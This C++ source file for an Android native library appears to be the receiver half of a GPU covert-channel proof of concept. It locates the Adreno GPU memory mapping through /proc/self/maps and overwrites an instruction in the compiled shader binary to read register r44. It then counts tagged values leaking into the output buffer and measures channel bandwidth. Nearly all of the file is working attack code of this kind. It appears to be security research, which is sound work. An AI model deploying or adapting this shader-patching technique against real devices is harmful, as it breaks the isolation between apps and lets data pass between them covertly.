#include <android/log.h>
#include <jni.h>

#include <EGL/egl.h>
#include <EGL/eglext.h>
#include <GLES3/gl3.h>
#include <GLES3/gl32.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <iomanip>
#include <ctime>
#include <chrono>

#define DEBUG   0

// Also change in gComputeShader accordingly of you are changing these
#define NUM_GROUPS      32
#define LOCAL_SIZE      1024

static const char gComputeShader[] =
        "#version 320 es\n"
        "layout(local_size_x = 1024) in;\n" // <- CHANGE HERE
        "layout(binding = 0) readonly buffer Input0 {\n"
        "    uint data[];\n"
        "} input0;\n"
        "layout(binding = 1) readonly buffer Input1 {\n"
        "    uint data[];\n"
        "} input1;\n"
        "layout(binding = 2) writeonly buffer Output {\n"
        "    uint data[];\n"
        "} output0;\n"
        "void main()\n"
        "{\n"
        "    uint idx = gl_GlobalInvocationID.x;\n"
        "    output0.data[idx] = uint(0xffffffff) + input1.data[idx];\n"
        "}\n";
//uint(0x12ab34cd) -
#define CHECK() \
{\
    GLenum err = glGetError(); \
    if (err != GL_NO_ERROR) \
    {\
        __android_log_print(ANDROID_LOG_INFO,  __FUNCTION__, "glGetError returns %d\n", err); \
    }\
}

void hexDump(const void* data, size_t size, FILE* out_f) {
    int fd = memfd_create("log_tmp", 0);
    FILE *f = fdopen(fd, "r+");

    char ascii[17];
    size_t i, j;
    ascii[16] = '\0';
    unsigned int addr = 0;
    for (i = 0; i < size; ++i) {
        if (i % 0x10 == 0) {
            fprintf(f, "%04X: ", addr);
            addr += 0x10;
        }

        fprintf(f, "%02X ", ((unsigned char*)data)[i]);

        if (((unsigned char*)data)[i] >= ' ' && ((unsigned char*)data)[i] <= '~') {
            ascii[i % 16] = ((unsigned char*)data)[i];
        } else {
            ascii[i % 16] = '.';
        }
        if ((i+1) % 8 == 0 || i+1 == size) {
            fprintf(f, " ");
            if ((i+1) % 16 == 0) {
                fprintf(f, "|  %s \n", ascii);
            } else if (i+1 == size) {
                ascii[(i+1) % 16] = '\0';
                if ((i+1) % 16 <= 8) {
                    fprintf(f, " ");
                }
                for (j = (i+1) % 16; j < 16; ++j) {
                    fprintf(f, "   ");
                }
                fprintf(f, "|  %s \n", ascii);
            }
        }
    }

    fseek(f, 0, SEEK_SET);
    fseek(f, 0L, SEEK_END);
    size_t sz = ftell(f);
    fseek(f, 0, SEEK_SET);

    void* buf = malloc(sz + 1);

    fread(buf, sz, 1, f);
    ((char*)buf)[sz] = 0;

    __android_log_write(ANDROID_LOG_INFO,  __FUNCTION__, (char*)buf);

    if (out_f != NULL) {
        fwrite(data, size, 1, out_f);
    }

    free(buf);

    fclose(f);
}

uint8_t current_reg = 3;

void patch() {
    FILE *fp = fopen("/proc/self/maps", "r");
    if (!fp) {
        perror("Error opening file");
    }

    __android_log_print(ANDROID_LOG_INFO,  __FUNCTION__,"Patching shader binary code\n");

    char line[1024];
    while (fgets(line, sizeof(line), fp)) {
        unsigned long start, end, offset;
        char perms[5], dev[12], name[1024];
        int ret = sscanf(line, "%lx-%lx %4s %x %37s %*s %1023[^\n]",
                         &start, &end, perms, &offset, dev, name);
        if (ret == 5) {
            name[0] = '\0';
        }


        if (perms[0] == 'r'
            && strcmp(name, "/dev/binderfs/hwbinder") != 0
            && strcmp(name, "/dev/binderfs/binder") != 0
            && strcmp(name, "/dev/kgsl-3d0") == 0) {
            __android_log_print(ANDROID_LOG_INFO,  __FUNCTION__, "%lx-%lx | %s | %lx | %s\n", start, end, perms, offset, name);

            if (*(uint8_t*)start == 0xcf) {

                if (1) {
                    hexDump((void *)start, 0x90, NULL);
                }

                // Covert channel over register r44
                *(uint32_t*)(start + 0x4c) = 0xc02604b1;

                if (1) {
                    hexDump((void*)start, 0x90, NULL);

                    FILE* f3 = fopen("/data/data/com.example.covertchannelreceiver/cache/shader.bin", "w");
                    fwrite((void*)start, 0x90, 1, f3);
                    fclose(f3);
                }
            }
        }
    }

    fclose(fp);

    __android_log_print(ANDROID_LOG_INFO,  __FUNCTION__,"Done.\n");
}

GLuint loadShader(GLenum shaderType, const char* pSource) {
    GLuint shader = glCreateShader(shaderType);
    if (shader) {
        glShaderSource(shader, 1, &pSource, NULL);
        glCompileShader(shader);
        GLint compiled = 0;
        glGetShaderiv(shader, GL_COMPILE_STATUS, &compiled);
        if (!compiled) {
            GLint infoLen = 0;
            glGetShaderiv(shader, GL_INFO_LOG_LENGTH, &infoLen);
            if (infoLen) {
                char* buf = (char*) malloc(infoLen);
                if (buf) {
                    glGetShaderInfoLog(shader, infoLen, NULL, buf);
                    __android_log_print(ANDROID_LOG_INFO,  __FUNCTION__, "Could not compile shader %d:\n%s\n", shaderType, buf);
                    free(buf);
                }
                glDeleteShader(shader);
                shader = 0;
            }
        }
    }
    return shader;
}

GLuint createComputeProgram(const char* pComputeSource) {
    GLuint computeShader = loadShader(GL_COMPUTE_SHADER, pComputeSource);
    if (!computeShader) {
        return 0;
    }

    GLuint program = glCreateProgram();
    if (program) {
        glAttachShader(program, computeShader);
        glLinkProgram(program);
        GLint linkStatus = GL_FALSE;
        glGetProgramiv(program, GL_LINK_STATUS, &linkStatus);
        if (linkStatus != GL_TRUE) {
            GLint bufLength = 0;
            glGetProgramiv(program, GL_INFO_LOG_LENGTH, &bufLength);
            if (bufLength) {
                char* buf = (char*) malloc(bufLength);
                if (buf) {
                    glGetProgramInfoLog(program, bufLength, NULL, buf);
                    __android_log_print(ANDROID_LOG_INFO,  __FUNCTION__, "Could not link program:\n%s\n", buf);
                    free(buf);
                }
            }
            glDeleteProgram(program);
            program = 0;
        }
    }
    return program;
}

void setupSSBufferObject(GLuint& ssbo, GLuint index, unsigned int* pIn, GLuint count)
{
    glGenBuffers(1, &ssbo);
    glBindBuffer(GL_SHADER_STORAGE_BUFFER, ssbo);

    glBufferData(GL_SHADER_STORAGE_BUFFER, count * sizeof(unsigned int), pIn, GL_STATIC_DRAW);
    glBindBufferBase(GL_SHADER_STORAGE_BUFFER, index, ssbo);
}

bool isMemoryAllValue(const void* ptr, size_t size, uint8_t value) {
    const unsigned char* bytes = (const unsigned char*)ptr;
    for (size_t i = 0; i < size; i++) {
        if (bytes[i] != value) {
            return false;
        }
    }
    return true;
}

double max_cc_GBperS = 0.0;
double max_GB_per_s = 0.0;
unsigned int max_convert_channel_ctr = 0;

void computeShader()
{
    GLuint computeProgram;
    GLuint input0SSbo;
    GLuint input1SSbo;
    GLuint outputSSbo;

    CHECK();
    computeProgram = createComputeProgram(gComputeShader);
    CHECK();

    const GLuint arraySize = NUM_GROUPS * LOCAL_SIZE;
    unsigned int f0[arraySize];
    unsigned int f1[arraySize];
    for (GLuint i = 0; i < arraySize; ++i)
    {
        f0[i] = 0;
        f1[i] = 0;
    }
    setupSSBufferObject(input0SSbo, 0, f0, arraySize);
    setupSSBufferObject(input1SSbo, 1, f1, arraySize);
    setupSSBufferObject(outputSSbo, 2, NULL, arraySize);
    CHECK();

    glUseProgram(computeProgram);

    patch();

    for (unsigned int k = 0; k < 1000; k++) {
        unsigned int convert_channel_ctr = 0;
        unsigned int first_idx = 0;

        auto start_time = std::chrono::high_resolution_clock::now();

        glDispatchCompute(NUM_GROUPS, 1, 1);   // arraySize/local_size_x
        //glMemoryBarrier(GL_SHADER_STORAGE_BARRIER_BIT);
        //CHECK();

        glBindBuffer(GL_SHADER_STORAGE_BUFFER, outputSSbo);
        unsigned int *pOut = (unsigned int *) glMapBufferRange(GL_SHADER_STORAGE_BUFFER, 0,
                                                               arraySize * sizeof(unsigned int),
                                                               GL_MAP_READ_BIT);

        //hexDump((void *)pOut, 0x400, NULL);

        /*for (unsigned j = 0; j < NUM_GROUPS * LOCAL_SIZE; j++) {
            if ((pOut[j] & 0xFFF00000) == 0xabc00000) {
                convert_channel_ctr++;
                if (first_idx == 0) {
                    first_idx = j;
                }
            }
        }
        __android_log_print(ANDROID_LOG_INFO, __FUNCTION__, "convert_channel_ctr: 0x%x\n",
                            convert_channel_ctr);

        //if (convert_channel_ctr > 50) {
        //    hexDump((void*)&pOut[first_idx], 0x200, NULL);
        //}

        if (convert_channel_ctr > max_convert_channel_ctr) {
            max_convert_channel_ctr = convert_channel_ctr;
        }

        __android_log_print(ANDROID_LOG_INFO, __FUNCTION__, "convert_channel_ctr: 0x%x | max: 0x%x\n",
                            convert_channel_ctr, max_convert_channel_ctr);

        glUnmapBuffer(GL_SHADER_STORAGE_BUFFER);
        continue;*/

        auto end_time = std::chrono::high_resolution_clock::now();
        auto exec_time = end_time - start_time;

        // Detect how much data was transmitted
        bool cc_seen [64 * LOCAL_SIZE];
        for (unsigned int j = 0; j < NUM_GROUPS * LOCAL_SIZE; j++) {
            cc_seen[j] = false;
        }

        for (unsigned j = 0; j < NUM_GROUPS * LOCAL_SIZE; j++) {
            if ((pOut[j] & 0xFFF00000) == 0xabc00000) {
                //__android_log_print(ANDROID_LOG_INFO,  __FUNCTION__, "Seen covert channel tag value\n");
                //convert_channel_ctr++;

                cc_seen[pOut[j] & 0xffff] = true;

                /*for (unsigned int p = 1; p < 8; p++) {
                    if (pOut[j + p] < NUM_GROUPS * LOCAL_SIZE - 1) {
                        cc_seen[pOut[j + p] & 0xffff] = true;
                    }
                }*/
            }
        }

        //glUnmapBuffer(GL_SHADER_STORAGE_BUFFER);
        //continue;

        for (unsigned int j = 0; j < NUM_GROUPS * LOCAL_SIZE; j++) {
            if (cc_seen[j]) {
                convert_channel_ctr++;
            }
        }

        if (convert_channel_ctr != 0) {
            double sizeInGB =
                    (double) (NUM_GROUPS * LOCAL_SIZE * sizeof(int)) / (1024.0 * 1024.0 * 1024.0);
            double GB_per_s = (sizeInGB) /
                              ((unsigned long) (std::chrono::duration_cast<std::chrono::nanoseconds>(
                                      exec_time).count()) / 1e9);

            __android_log_print(ANDROID_LOG_INFO, __FUNCTION__, "raw GB/s: %f | max: %f\n", GB_per_s, max_GB_per_s);

            if (GB_per_s > max_GB_per_s) {
                max_GB_per_s = GB_per_s;
            }

            __android_log_print(ANDROID_LOG_INFO, __FUNCTION__, "convert_channel_ctr: 0x%x | max: 0x%x\n",
                                convert_channel_ctr, max_convert_channel_ctr);
            sizeInGB = (double) (convert_channel_ctr * sizeof(int)) / (1024.0 * 1024.0 * 1024.0);
            GB_per_s = (sizeInGB) /
                       ((unsigned long) (std::chrono::duration_cast<std::chrono::nanoseconds>(
                               exec_time).count()) / 1e9);

            if (GB_per_s > max_cc_GBperS) {
                max_cc_GBperS = GB_per_s;
            }

            if (convert_channel_ctr > max_convert_channel_ctr) {
                max_convert_channel_ctr = convert_channel_ctr;
            }

            __android_log_print(ANDROID_LOG_INFO, __FUNCTION__, "covert channel GB/s: %f | max: %f\n",
                                GB_per_s, max_cc_GBperS);
        }

        glUnmapBuffer(GL_SHADER_STORAGE_BUFFER);
    }



    __android_log_print(ANDROID_LOG_INFO,  __FUNCTION__, "verification PASSED\n");
    glDeleteProgram(computeProgram);
}

void setupComputeShader() {
    __android_log_print(ANDROID_LOG_INFO,  __FUNCTION__,"num_platforms: %d\n", 0);

    EGLDisplay dpy = eglGetDisplay(EGL_DEFAULT_DISPLAY);
    if (dpy == EGL_NO_DISPLAY) {
        __android_log_print(ANDROID_LOG_INFO,  __FUNCTION__, "eglGetDisplay returned EGL_NO_DISPLAY.\n");
        return;
    }

    EGLint majorVersion;
    EGLint minorVersion;
    EGLBoolean returnValue = eglInitialize(dpy, &majorVersion, &minorVersion);
    if (returnValue != EGL_TRUE) {
        __android_log_print(ANDROID_LOG_INFO,  __FUNCTION__, "eglInitialize failed\n");
        return;
    }

    EGLConfig cfg;
    EGLint count;
    EGLint s_configAttribs[] = {
            EGL_RENDERABLE_TYPE, EGL_OPENGL_ES3_BIT_KHR,
            EGL_NONE };
    if (eglChooseConfig(dpy, s_configAttribs, &cfg, 1, &count) == EGL_FALSE) {
        __android_log_print(ANDROID_LOG_INFO,  __FUNCTION__, "eglChooseConfig failed\n");
        return;
    }

    EGLint context_attribs[] = { EGL_CONTEXT_CLIENT_VERSION, 3, EGL_NONE };
    EGLContext context = eglCreateContext(dpy, cfg, EGL_NO_CONTEXT, context_attribs);

    returnValue = eglMakeCurrent(dpy, EGL_NO_SURFACE, EGL_NO_SURFACE, context);
    if (returnValue != EGL_TRUE) {
        __android_log_print(ANDROID_LOG_INFO,  __FUNCTION__, "eglMakeCurrent failed returned %d\n", returnValue);
        return;
    }

    computeShader();

    eglDestroyContext(dpy, context);
}

extern "C" JNIEXPORT jint JNI_OnLoad(JavaVM* vm, void* reserved) {
    __android_log_print(ANDROID_LOG_INFO,  __FUNCTION__,"Hello from shared library!\n");

    if (DEBUG) {
        setupComputeShader();
    }

    return JNI_VERSION_1_6;
}
extern "C"
JNIEXPORT void JNICALL
Java_com_example_covertchannelreceiver_MainActivity_runComputeShader(JNIEnv *env, jobject thiz) {
    if (!DEBUG) {
        setupComputeShader();
    }
}